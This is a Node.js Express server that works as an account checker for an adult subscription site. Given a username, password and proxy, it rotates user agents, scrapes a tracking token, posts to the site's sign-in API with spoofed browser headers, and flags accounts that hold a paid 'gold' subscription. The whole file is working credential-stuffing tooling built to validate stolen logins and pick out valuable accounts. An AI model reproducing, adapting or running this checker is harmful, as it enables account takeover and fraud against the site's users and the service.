const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

function getRandomUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

function parseProxy(str) {
  try {
    const parts = str.split(':');
    if (parts.length === 4) {
      const [host, port, username, password] = parts;
      const portNum = parseInt(port);
      if (!isNaN(portNum) && host) {
        return { host, port: portNum, protocol: 'http', auth: { username, password } };
      }
    }
    const url = new URL(str);
    const protocol = url.protocol.replace(':', '');
    const host = url.hostname;
    const port = parseInt(url.port) || (protocol === 'https' ? 443 : 80);
    const auth = url.username ? { username: url.username, password: url.password } : undefined;
    if (protocol === 'http' || protocol === 'https') {
      return { host, port, protocol, auth };
    }
    return null;
  } catch {
    return null;
  }
}

app.post('/api/check', async (req, res) => {
  try {
    const { username, password, proxy } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, error: 'Missing credentials' });
    }

    let proxyConfig = null;
    if (proxy) {
      const parsed = parseProxy(proxy);
      if (parsed) {
        proxyConfig = parsed;
        console.log(`[PROXY] Using ${parsed.host}:${parsed.port}`);
      } else {
        console.warn(`[PROXY] Invalid format: ${proxy} – skipping`);
      }
    }

    const axiosConfig = {
      timeout: 30000,
      headers: {
        'User-Agent': getRandomUA(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
      }
    };
    if (proxyConfig) axiosConfig.proxy = proxyConfig;

    let debug = { proxyUsed: proxyConfig ? `${proxyConfig.host}:${proxyConfig.port}` : 'none' };

    // Step 1: Get trackingParamsBag
    let homeResp;
    try {
      homeResp = await axios.get('https://faphouse.com/', axiosConfig);
    } catch (e) {
      return res.json({
        success: false,
        error: `Homepage fetch failed: ${e.message}`,
        debug: { ...debug, homeError: e.message }
      });
    }

    const html = homeResp.data;
    debug.homeStatus = homeResp.status;
    const match = html.match(/trackingParamsBag\\":\\"([^"]+)\\"/);
    if (!match) {
      return res.json({ success: false, error: 'trackingParamsBag not found', debug });
    }
    const trackingParamsBag = match[1];
    debug.trackingParamsBag = trackingParamsBag;

    // Step 2: Login
    const loginPayload = {
      login: username,
      password: password,
      rememberMe: '1',
      recaptcha: '',
      trackingParamsBag: trackingParamsBag
    };

    const loginHeaders = {
      'Host': 'faphouse.com',
      'Connection': 'keep-alive',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Origin': 'https://faphouse.com',
      'Referer': 'https://faphouse.com/',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'X-CSRF-Token': 'null',
      'User-Agent': getRandomUA()
    };

    let loginResp;
    try {
      loginResp = await axios.post(
        'https://faphouse.com/api/auth/signin',
        loginPayload,
        { ...axiosConfig, headers: loginHeaders }
      );
    } catch (e) {
      let errorMsg = e.message;
      if (e.response) {
        errorMsg = `HTTP ${e.response.status}: ${typeof e.response.data === 'string' ? e.response.data.substring(0, 200) : JSON.stringify(e.response.data)}`;
        debug.loginErrorStatus = e.response.status;
        debug.loginErrorData = e.response.data;
      } else if (e.request) {
        errorMsg = 'No response (proxy dead or network issue)';
      }
      return res.json({
        success: false,
        error: `Login request failed: ${errorMsg}`,
        debug
      });
    }

    const data = loginResp.data;
    debug.loginStatus = loginResp.status;
    debug.loginData = data;

    // Check invalid credential
    if (data && data.message && typeof data.message === 'string') {
      const msg = data.message.toLowerCase();
      if (msg.includes('invalid credential') || msg.includes('invalid credentials')) {
        return res.json({ success: false, gold: false, error: 'Invalid credential', debug });
      }
    }

    // Determine success
    let success = false;
    if (data && (data.success === true || data.success === 'true')) success = true;
    if (data && data.status === 'success') success = true;
    if (data && data.message === 'success') success = true;
    if (data && data.user && data.user.id) success = true;
    if (data && data.token) success = true;

    if (!success) {
      if (typeof data === 'string' && data.includes('<!DOCTYPE html>')) {
        return res.json({ success: false, gold: false, error: 'CAPTCHA or HTML response', debug });
      }
      return res.json({ success: false, gold: false, error: 'Login failed (no success indicator)', debug });
    }

    // Gold check
    let hasGold = false;
    if (data && data.hasGoldSubscription !== undefined) {
      hasGold = data.hasGoldSubscription === true || data.hasGoldSubscription === 'true';
    } else if (data && data.user && data.user.hasGoldSubscription !== undefined) {
      hasGold = data.user.hasGoldSubscription === true || data.user.hasGoldSubscription === 'true';
    } else if (data && data.subscription && data.subscription.gold === true) {
      hasGold = true;
    } else {
      try {
        const token = data.token || (data.user && data.user.token) || '';
        if (token) {
          const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
            ...axiosConfig,
            headers: {
              ...loginHeaders,
              'Authorization': `Bearer ${token}`
            }
          });
          if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
            hasGold = profileResp.data.hasGoldSubscription === true;
          }
          debug.profileData = profileResp.data;
        }
      } catch (_) {}
    }

    return res.json({ success: true, gold: hasGold, debug });

  } catch (unexpectedError) {
    console.error('UNEXPECTED ERROR:', unexpectedError);
    return res.status(500).json({
      success: false,
      error: 'Internal server error: ' + unexpectedError.message,
      stack: process.env.NODE_ENV === 'development' ? unexpectedError.stack : undefined
    });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

module.exports = app;
